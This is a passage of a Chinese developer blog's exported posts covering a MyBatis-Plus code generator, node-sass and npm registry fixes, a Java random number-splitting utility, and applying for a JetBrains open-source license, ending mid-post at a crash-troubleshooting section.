class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 读取控制台内容信息</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> String <span class="title">scanner</span><span class="params">(String tip)</span> </span>&#123;</span><br><span class="line">        Scanner scanner = <span class="keyword">new</span> Scanner(System.in);</span><br><span class="line">        System.out.println((<span class="string">&quot;请输入&quot;</span> + tip + <span class="string">&quot;：&quot;</span>));</span><br><span class="line">        <span class="keyword">if</span> (scanner.hasNext()) &#123;</span><br><span class="line">            String next = scanner.next();</span><br><span class="line">            <span class="keyword">if</span> (StringUtils.isNotEmpty(next)) &#123;</span><br><span class="line">                <span class="keyword">return</span> next;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> MybatisPlusException(<span class="string">&quot;请输入正确的&quot;</span> + tip + <span class="string">&quot;！&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 全局配置</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> com.baomidou.mybatisplus.generator.config.<span class="function">GlobalConfig <span class="title">buildGlobalConfig</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        com.baomidou.mybatisplus.generator.config.GlobalConfig globalConfig = <span class="keyword">new</span> GlobalConfig();</span><br><span class="line">        globalConfig.setAuthor(author);</span><br><span class="line">        globalConfig.setOpen(<span class="keyword">false</span>);</span><br><span class="line">        globalConfig.setSwagger2(<span class="keyword">false</span>);</span><br><span class="line">        globalConfig.setBaseResultMap(<span class="keyword">false</span>);</span><br><span class="line">        globalConfig.setFileOverride(<span class="keyword">true</span>);</span><br><span class="line">        globalConfig.setDateType(DateType.ONLY_DATE);</span><br><span class="line">        globalConfig.setEntityName(<span class="string">&quot;%s&quot;</span>);</span><br><span class="line">        globalConfig.setMapperName(<span class="string">&quot;%sMapper&quot;</span>);</span><br><span class="line">        globalConfig.setXmlName(<span class="string">&quot;%sMapper&quot;</span>);</span><br><span class="line">        globalConfig.setServiceName(<span class="string">&quot;%sService&quot;</span>);</span><br><span class="line">        globalConfig.setServiceImplName(<span class="string">&quot;%sServiceImpl&quot;</span>);</span><br><span class="line">        globalConfig.setControllerName(<span class="string">&quot;%sController&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> globalConfig;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 数据源配置</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> DataSourceConfig <span class="title">buildDataSourceConfig</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        DataSourceConfig dataSourceConfig = <span class="keyword">new</span> DataSourceConfig();</span><br><span class="line">        dataSourceConfig.setUrl(mysql.url);</span><br><span class="line">        dataSourceConfig.setDriverName(mysql.driver_name);</span><br><span class="line">        dataSourceConfig.setUsername(mysql.user);</span><br><span class="line">        dataSourceConfig.setPassword(mysql.password);</span><br><span class="line">        <span class="keyword">return</span> dataSourceConfig;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 包配置</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> projectPath</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> bizName</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> PackageConfig <span class="title">buildPackageConfig</span><span class="params">(String projectPath,String bizName)</span> </span>&#123;</span><br><span class="line">        PackageConfig packageConfig = <span class="keyword">new</span> PackageConfig();</span><br><span class="line">        packageConfig.setModuleName(<span class="string">&quot;&quot;</span>);</span><br><span class="line">        packageConfig.setParent(base_path);</span><br><span class="line">        packageConfig.setEntity(<span class="string">&quot;model&quot;</span> + (StringUtils.isNotBlank(bizName) ? <span class="string">&quot;.&quot;</span> + bizName : <span class="string">&quot;&quot;</span>));</span><br><span class="line">        packageConfig.setService(<span class="string">&quot;service&quot;</span>+(StringUtils.isNotBlank(bizName) ? <span class="string">&quot;.&quot;</span> + bizName : <span class="string">&quot;&quot;</span>));</span><br><span class="line">        packageConfig.setServiceImpl(<span class="string">&quot;service&quot;</span>+(StringUtils.isNotBlank(bizName) ? <span class="string">&quot;.&quot;</span> + bizName : <span class="string">&quot;&quot;</span>)+<span class="string">&quot;.impl&quot;</span>);</span><br><span class="line">        packageConfig.setMapper(<span class="string">&quot;mapper&quot;</span>+(StringUtils.isNotBlank(bizName) ? <span class="string">&quot;.&quot;</span> + bizName : <span class="string">&quot;&quot;</span>));</span><br><span class="line"></span><br><span class="line">        Map&lt;String, String&gt; pathInfo = Maps.newHashMap();</span><br><span class="line">        pathInfo.put(ConstVal.ENTITY_PATH, calcPath4Entity(projectPath,bizName));</span><br><span class="line">        pathInfo.put(ConstVal.MAPPER_PATH, calcPath4Mapper(projectPath,bizName));</span><br><span class="line">        pathInfo.put(ConstVal.XML_PATH, calcPath4Xml(projectPath,bizName));</span><br><span class="line">        pathInfo.put(ConstVal.SERVICE_PATH, calcPath4Service(projectPath,bizName));</span><br><span class="line">        pathInfo.put(ConstVal.SERVICE_IMPL_PATH, calcPath4ServiceImpl(projectPath,bizName));</span><br><span class="line">        packageConfig.setPathInfo(pathInfo);</span><br><span class="line">        <span class="keyword">return</span> packageConfig;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 设置路径 - model.java</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> projectPath</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> bizName</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> String <span class="title">calcPath4Entity</span><span class="params">(String projectPath,String bizName)</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span>  projectPath + module_path.entity + <span class="string">&quot;/src/main/java/&quot;</span> + base_path.replaceAll(<span class="string">&quot;\\.&quot;</span>,<span class="string">&quot;/&quot;</span>) + <span class="string">&quot;/model/&quot;</span> + bizName + <span class="string">&quot;/&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 设置路径 - mapper.java</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> projectPath</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> bizName</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> String <span class="title">calcPath4Mapper</span><span class="params">(String projectPath, String bizName)</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span>  projectPath + module_path.mapper + <span class="string">&quot;/src/main/java/&quot;</span> + base_path.replaceAll(<span class="string">&quot;\\.&quot;</span>,<span class="string">&quot;/&quot;</span>) + <span class="string">&quot;/mapper/&quot;</span> + bizName + <span class="string">&quot;/&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 设置路径 - service.java</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> projectPath</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> bizName</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> String <span class="title">calcPath4Service</span><span class="params">(String projectPath, String bizName)</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span>  projectPath + module_path.service + <span class="string">&quot;/src/main/java/&quot;</span> + base_path.replaceAll(<span class="string">&quot;\\.&quot;</span>,<span class="string">&quot;/&quot;</span>) + <span class="string">&quot;/service/&quot;</span> + bizName + <span class="string">&quot;/&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 设置路径 - serviceImpl.java</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> projectPath</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> bizName</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> String <span class="title">calcPath4ServiceImpl</span><span class="params">(String projectPath, String bizName)</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span>  projectPath + module_path.service + <span class="string">&quot;/src/main/java/&quot;</span> + base_path.replaceAll(<span class="string">&quot;\\.&quot;</span>,<span class="string">&quot;/&quot;</span>) + <span class="string">&quot;/service/&quot;</span> + bizName + <span class="string">&quot;/impl/&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 设置路径 - model.xml</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> projectPath</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> bizName</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> String <span class="title">calcPath4Xml</span><span class="params">(String projectPath, String bizName)</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span>  projectPath + module_path.mapper + <span class="string">&quot;/src/main/resources/mapper/&quot;</span> + bizName + <span class="string">&quot;/&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 模板配置</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> TemplateConfig <span class="title">buildTemplateConfig</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        TemplateConfig templateConfig = <span class="keyword">new</span> TemplateConfig();</span><br><span class="line">        <span class="comment">//可以对controller、service、entity模板进行配置</span></span><br><span class="line">        <span class="comment">//mapper.xml模板需单独配置</span></span><br><span class="line">        <span class="keyword">return</span> templateConfig;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 策略配置</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> tableNames</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> StrategyConfig <span class="title">buildStrategyConfig</span><span class="params">(String[] tableNames)</span> </span>&#123;</span><br><span class="line">        StrategyConfig strategyConfig = <span class="keyword">new</span> StrategyConfig();</span><br><span class="line">        strategyConfig.setNaming(NamingStrategy.underline_to_camel);</span><br><span class="line">        strategyConfig.setColumnNaming(NamingStrategy.underline_to_camel);</span><br><span class="line">        strategyConfig.setEntityLombokModel(<span class="keyword">true</span>);</span><br><span class="line">        strategyConfig.setRestControllerStyle(<span class="keyword">true</span>);</span><br><span class="line">        <span class="comment">// 当表名中带*号时可以启用通配符模式</span></span><br><span class="line">        <span class="keyword">if</span> (tableNames.length == <span class="number">1</span> &amp;&amp; tableNames[<span class="number">0</span>].contains(<span class="string">&quot;*&quot;</span>)) &#123;</span><br><span class="line">            String[] likeStr = tableNames[<span class="number">0</span>].split(<span class="string">&quot;_&quot;</span>);</span><br><span class="line">            String likePrefix = likeStr[<span class="number">0</span>] + <span class="string">&quot;_&quot;</span>;</span><br><span class="line">            strategyConfig.setLikeTable(<span class="keyword">new</span> LikeTable(likePrefix));</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            strategyConfig.setInclude(tableNames);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 自动填充时间字段</span></span><br><span class="line">        List&lt;TableFill&gt; tableFillList = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">        tableFillList.add(<span class="keyword">new</span> TableFill(<span class="string">&quot;create_time&quot;</span>, FieldFill.INSERT));</span><br><span class="line">        tableFillList.add(<span class="keyword">new</span> TableFill(<span class="string">&quot;update_time&quot;</span>, FieldFill.INSERT_UPDATE));</span><br><span class="line">        strategyConfig.setTableFillList(tableFillList);</span><br><span class="line">        <span class="keyword">return</span> strategyConfig;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 自定义配置</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> projectPath</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> bizName</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> InjectionConfig <span class="title">buildInjectionConfig</span><span class="params">(String projectPath, String bizName)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// 自定义配置</span></span><br><span class="line">        InjectionConfig injectionConfig = <span class="keyword">new</span> InjectionConfig() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">initMap</span><span class="params">()</span> </span>&#123;</span><br><span class="line">                <span class="comment">// 可用于自定义属性</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="comment">// 模板引擎是Velocity</span></span><br><span class="line">        String templatePath = <span class="string">&quot;/templates/mapper.xml.vm&quot;</span>;</span><br><span class="line">        <span class="comment">// 自定义输出配置</span></span><br><span class="line">        List&lt;FileOutConfig&gt; focList = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">        <span class="comment">// 自定义配置会被优先输出</span></span><br><span class="line">        focList.add(<span class="keyword">new</span> FileOutConfig(templatePath) &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> String <span class="title">outputFile</span><span class="params">(TableInfo tableInfo)</span> </span>&#123;</span><br><span class="line">                <span class="comment">// 自定义输出文件名 ， 如果你 Entity 设置了前后缀、此处注意 xml 的名称会跟着发生变化！！</span></span><br><span class="line">                <span class="keyword">return</span> projectPath + <span class="string">&quot;mapper/src/main/resources/mapper/&quot;</span> + bizName</span><br><span class="line">                        + <span class="string">&quot;/&quot;</span> + tableInfo.getEntityName() + <span class="string">&quot;Mapper&quot;</span> + StringPool.DOT_XML;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        injectionConfig.setFileOutConfigList(focList);</span><br><span class="line">        <span class="keyword">return</span> injectionConfig;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>最后，我们直接运行这个java类，在控制台输入 业务模块名称 和 表名，点击回车即可生成。</p>
]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>mybatis-plus</tag>
        <tag>代码生成</tag>
        <tag>mybatis-plus-generator</tag>
      </tags>
  </entry>
  <entry>
    <title>node升级导致node-sass依赖不支持</title>
    <url>/2020/07/03/node-up-sass-nosupport-error/</url>
    <content><![CDATA[<h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><p>node更新较快，升级之后，出现node-sass依赖不支持的情况，错误提示如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ERROR &#123;</span><br><span class="line">  err: Error: Node Sass does not yet support your current environment: OS X 64-bit with Unsupported runtime (88)</span><br><span class="line">  For more information on which environments are supported please see:</span><br><span class="line">  https:&#x2F;&#x2F;github.com&#x2F;sass&#x2F;node-sass&#x2F;releases&#x2F;tag&#x2F;v4.14.1</span><br><span class="line">      at module.exports (&#x2F;Users&#x2F;mac&#x2F;xxxxxxxx</span><br><span class="line">      at xxxxxxxxxxxx</span><br></pre></td></tr></table></figure>
<h4 id="处理方式"><a href="#处理方式" class="headerlink" title="处理方式"></a>处理方式</h4><p>1，升级node-sass即可</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npm rebuild node-sass</span><br></pre></td></tr></table></figure>


]]></content>
      <categories>
        <category>linux</category>
      </categories>
      <tags>
        <tag>node</tag>
      </tags>
  </entry>
  <entry>
    <title>更换npm资源地址</title>
    <url>/2020/07/01/npm-change-registry/</url>
    <content><![CDATA[<h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><p>&nbsp;&nbsp;&nbsp;&nbsp;在使用npm工具安装软件的时候，常常由于国内网络环境的缘故，导致访问国外资源站点速度特别慢，甚至网络异常。所以通常，我们会更换npm的资源地址为国内的镜像站点</p>
<p>常见的npm资源地址访问网络异常提示如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">info There appears to be trouble with your network connection. Retrying...</span><br><span class="line">error An unexpected error occurred: &quot;https:&#x2F;&#x2F;registry.yarnpkg.com&#x2F;hexo: getaddrinfo ENOTFOUND registry.yarnpkg.com&quot;.</span><br><span class="line">info If you think this is a bug, please open a bug report with the information provided in &quot;&#x2F;Users&#x2F;mac&#x2F;.config&#x2F;yarn&#x2F;global&#x2F;yarn-error.log&quot;.</span><br></pre></td></tr></table></figure>
<h4 id="更换资源地址"><a href="#更换资源地址" class="headerlink" title="更换资源地址"></a>更换资源地址</h4><p>1，国内一般使用taobao的镜像站点作为资源地址，通过下面的命令可以进行更换：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npm config <span class="built_in">set</span> registry https://registry.npm.taobao.org</span><br><span class="line">npm config <span class="built_in">set</span> disturl https://npm.taobao.org/dist</span><br></pre></td></tr></table></figure>
<p>2，验证配置，查看配置的registry和disturl地址</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npm get registry</span><br><span class="line">npm get disturl</span><br></pre></td></tr></table></figure>
<p>3，如果需要还原为默认的地址，执行下面的命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">npm config delete registry</span><br><span class="line">npm config delete disturl</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>linux</category>
      </categories>
      <tags>
        <tag>npm</tag>
      </tags>
  </entry>
  <entry>
    <title>数字随机拆分-类似发红包</title>
    <url>/2020/06/17/num-split-utils/</url>
    <content><![CDATA[<h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><p>有的时候，我们需要做一个类似微信发红包的逻辑，这就涉及到随机拆分红包的功能了。</p>
<p>那么如何去实现这个能力呢？</p>
<p>最简单的逻辑：先创建一个长度等于发放人数的数组，先赋值一个初始值，防止随机分配的时候未进行赋值。然后将剩下的值，随机分配的这个数组中即可。</p>
<h4 id="代码示例"><a href="#代码示例" class="headerlink" title="代码示例"></a>代码示例</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">* 数字随机拆分-类似发红包</span></span><br><span class="line"><span class="comment">* <span class="doctag">@param</span> allNum  被拆分的数字</span></span><br><span class="line"><span class="comment">* <span class="doctag">@param</span> split 拆成几个</span></span><br><span class="line"><span class="comment">* <span class="doctag">@return</span> 拆分后的集合</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> List&lt;Integer&gt; <span class="title">splitNum</span><span class="params">(<span class="keyword">int</span> allNum, <span class="keyword">int</span> split)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(allNum &lt; split || allNum &lt; <span class="number">1</span>)&#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(<span class="string">&quot;被拆分的总数小于需要拆分的份数&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 创建一个长度等于split的数组</span></span><br><span class="line">    Integer[] array = <span class="keyword">new</span> Integer[split];</span><br><span class="line">    <span class="comment">// 先给数组的每个元素赋值最基础的值：1</span></span><br><span class="line">    Arrays.fill(array,<span class="number">1</span>);</span><br><span class="line">    <span class="comment">// 减掉分配的数额</span></span><br><span class="line">    allNum -= split;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// while遍历总额，随机进行分配，逐个元素进行累计赋值</span></span><br><span class="line">    <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">    Random random = <span class="keyword">new</span> Random();</span><br><span class="line">    <span class="keyword">while</span> (allNum &gt; <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="comment">// 最后一个直接赋值给第一个</span></span><br><span class="line">        <span class="keyword">if</span>(allNum == <span class="number">1</span>)&#123;</span><br><span class="line">            array[<span class="number">0</span>] += <span class="number">1</span>;</span><br><span class="line">            allNum --;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 随机赋值</span></span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">int</span> boud = (allNum / <span class="number">2</span>) + <span class="number">1</span>;</span><br><span class="line">            boud = boud &gt; <span class="number">2</span> ? boud / <span class="number">2</span> : boud;</span><br><span class="line">            <span class="keyword">int</span> num = random.nextInt(boud) + <span class="number">1</span>;</span><br><span class="line">            array[i++ % split] += num;</span><br><span class="line">            allNum -= num;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    List&lt;Integer&gt; res = Arrays.stream(array).collect(Collectors.toList());</span><br><span class="line">    <span class="comment">// 打乱</span></span><br><span class="line">    Collections.shuffle(res);</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>测试一下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;10分成10份：&quot;</span> + splitNum(<span class="number">10</span>,<span class="number">10</span>));</span><br><span class="line">    System.out.println(<span class="string">&quot;100分成10份：&quot;</span> + splitNum(<span class="number">100</span>,<span class="number">10</span>));</span><br><span class="line">    System.out.println(<span class="string">&quot;10分成3份：&quot;</span> + splitNum(<span class="number">10</span>,<span class="number">3</span>));</span><br><span class="line">    System.out.println(<span class="string">&quot;500分成15份：&quot;</span> + splitNum(<span class="number">500</span>,<span class="number">15</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>输出示例：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">10分成10份：[1, 1, 1, 1, 1, 1, 1, 1, 1, 1]</span><br><span class="line">100分成10份：[3, 19, 11, 18, 6, 5, 3, 16, 10, 9]</span><br><span class="line">10分成3份：[2, 5, 3]</span><br><span class="line">500分成15份：[17, 15, 16, 36, 56, 15, 4, 59, 25, 22, 72, 23, 61, 48, 31]</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>发红包</tag>
        <tag>数字拆分</tag>
        <tag>随机数</tag>
      </tags>
  </entry>
  <entry>
    <title>开源项目申请JetBrains全家桶</title>
    <url>/2020/09/16/open-source-license-JetBrains-request/</url>
    <content><![CDATA[<h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><p>&nbsp;&nbsp;&nbsp;&nbsp;作为码农，一款优秀的开发工具必不可少，但往往优秀的工具都是收费的[偷笑]，不过破解方法也是层出不穷，只要你耐心去找，也是能用上的，不过想及时跟进最新版本，用上新功能，那还是得走正版这条路。</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;我们通过本文来聊一聊如何通过开源项目免费申请正版工具的许可，有效期1年，到期后，如果项目仍然符合申请条件可以申请续期。</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;不得不给JetBrains公司点个赞，是个有态度的公司[点赞]，这是对开源社区最强有力的支持。</p>
<p>申请要求：一个正在维护开源项目的拥有者或核心提交，非商业用途，并积极维护3个月以上，具体要求参见：<a href="https://www.jetbrains.com/community/opensource/#support">Free License Programs</a></p>
<p>申请地址：<a href="https://www.jetbrains.com/shop/eform/opensource?product=ALL">https://www.jetbrains.com/shop/eform/opensource?product=ALL</a></p>
<h4 id="填写申请"><a href="#填写申请" class="headerlink" title="填写申请"></a>填写申请</h4><p>本文使用的开源项目：<a href="https://github.com/Ln-guolin/spring-boot-starter-cache">https://github.com/Ln-guolin/spring-boot-starter-cache</a></p>
<p>很简单，在申请站点按照要求，填写项目信息即可，示例：<br><img src="https://soilove.oss-cn-hangzhou.aliyuncs.com/32e/ci/open-source-license-JetBrains-request.jpeg" alt="申请示例"></p>
<p>提交完成后，你会收到一封邮件，告知你，他们将评估您的项目，审核时间可能需要1-2周，最后会通过邮件通知你。</p>
<h4 id="审核通过"><a href="#审核通过" class="headerlink" title="审核通过"></a>审核通过</h4><p>通过审核后，你会收到下面这封邮件，你可以通过此邮件中的链接或pdf，继续操作以获取许可。</p>
<p><img src="https://soilove.oss-cn-hangzhou.aliyuncs.com/32e/jetbrains/tongguo02.png" alt="审核通过"></p>
<h4 id="获取许可"><a href="#获取许可" class="headerlink" title="获取许可"></a>获取许可</h4><p>1，点击邮件中的 “Take me to my license(s)”，根据引导完成账号注册和确认。</p>
<p>2，访问<a href="https://account.jetbrains.com/licenses">https://account.jetbrains.com/licenses</a>查看发放的许可</p>
<p><img src="https://soilove.oss-cn-hangzhou.aliyuncs.com/32e/jetbrains/licenses.png" alt="许可"></p>
<p>3，下载许可文件</p>
<p>点击邮件中的 “Download activation code for offline usage” 下载许可</p>
<p>下载的是一个zip文件，解压后有1个2017.3之前的和2018.1及其以后版本的，按需使用即可：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">NXBW9FTR6J-root@soilove.cn.zip</span><br><span class="line">├── NXBW9FTR6J-root@soilove.cn-for 2017.3 or earlier.txt</span><br><span class="line">└── NXBW9FTR6J-root@soilove.cn-for 2018.1 or later.txt</span><br></pre></td></tr></table></figure>
<h4 id="使用许可"><a href="#使用许可" class="headerlink" title="使用许可"></a>使用许可</h4><p>我用产品是“IntelliJ IDEA”，在他们官网下载目前最新的版本2020.2，完成安装，然后在激活的地方，把发放的许可贴进去即可。</p>
<p>激活的时候选择：Activation code</p>
<p align="center">
    <a href="#"><img src="https://soilove.oss-cn-hangzhou.aliyuncs.com/32e/jetbrains/new01.png" width="450px"></a>
</p>

<p>激活后的效果：</p>
<p align="center">
    <a href="#"><img src="https://soilove.oss-cn-hangzhou.aliyuncs.com/32e/jetbrains/new02.png" width="450px"></a>
</p>

<p>其他-插件地址：<br><a href="https://plugins.jetbrains.com/">https://plugins.jetbrains.com/</a></p>
<h4 id="推广logo设置"><a href="#推广logo设置" class="headerlink" title="推广logo设置"></a>推广logo设置</h4><p>点击邮件中的“<a href="https://www.jetbrains.com/company/brand/logos/">our Logo</a>”获取avg图标，将其设置到github README.md，帮助jetbrains推广他们的产品。</p>
<h4 id="问题处理-闪退"><a href="#问题处理-闪退" class="headerlink" title="问题处理-闪退"></a>问题处理-闪退</h4><p>我之前安装的版本是mac“2019.2”，安装了一堆插件，突然升级到“2020.2”出现了闪退问题，按照下面的方式进行排查解决。</p>
<p><strong>1，命令行启动，查看日志</strong></p>
<p>路径：应用程序 &gt;&gt; IntelliJ IDEA.app &gt;&gt; 右键 显示包内容 &gt;&gt; Contents &gt;&gt; MacOS</p>
<p>点击可执行文件：idea</p>
<p>控制台输出：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Last login: Sun Sep 27 23:37:00 on ttys001</span><br><span class="line">chenguolindeMacBook-Pro:~ chenguolin$ &#x2F;Applications&#x2F;IntelliJ\ IDEA.app&#x2F;Contents&#x2F;MacOS&#x2F;idea ; exit;</span><br><span class="line">2020-09-27 23:37:09.131 idea[30950:931173] allVms required 1.8*,1.8+</span><br><span class="line">2020-09-27 23:37:09.133 idea[30950:931176] Current Directory: &#x2F;Users&#x2F;chenguolin</span><br><span class="line">2020-09-27 23:37:09.134 idea[30950:931176] Value of IDEA_VM_OPTIONS is (null)</span><br><span class="line">2020-09-27 23:37:09.134 idea[30950:931176] Processing VMOptions file at &#x2F;Users&#x2F;chenguolin&#x2F;Library&#x2F;Application Support&#x2F;JetBrains&#x2F;IntelliJIdea2020.2&#x2F;idea.vmoptions</span><br><span class="line">2020-09-27 23:37:09.134 idea[30950:931176] Done</span><br><span class="line">OpenJDK 64-Bit Server VM warning: Option UseConcMarkSweepGC was deprecated in version 9.0 and will likely be removed in a future release.</span><br><span class="line">Error opening zip file or JAR manifest missing : ..&#x2F;bin&#x2F;jetbrains-agent.jar</span><br><span class="line">Error occurred during initialization of VM</span><br><span class="line">agent library failed to init: instrument</span><br><span class="line">logout</span><br><span class="line">Saving session...</span><br><span class="line">...copying shared history...</span><br><span class="line">...saving history...truncating history files...</span><br><span class="line">...completed.</span><br><span class="line"></span><br><span class="line">[进程已完成]</span><br></pre></td></tr></table></figure>
<p><strong>2，解决问题</strong></p>
